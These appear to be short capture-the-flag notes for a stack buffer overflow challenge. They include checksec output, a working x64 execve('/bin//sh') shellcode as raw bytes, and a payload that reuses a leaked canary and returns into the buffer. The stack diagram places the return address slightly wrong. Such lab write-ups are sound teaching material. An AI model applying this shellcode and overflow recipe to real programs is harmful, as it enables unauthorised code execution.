**Read source code**
- We can see there the program leak the address of buf, distance between buf and $rbp, also canary
- `read`,`gets` => Buffer overflow
- Stack
```
Buf
canary (rbp-0x8)
rbp
ret (rbp+0x0)
```
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
- So the idea is that store the shellcode into `buf` and return adress of buff.
---  
***PWNTOOLS***
- shellcode for x64 `\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05`
- leak canary: overflow to rbp-0x8
- payload = shellcode + (offset from buff to canary - len(shellcode)) +canary + b'a'*0x8 + buf
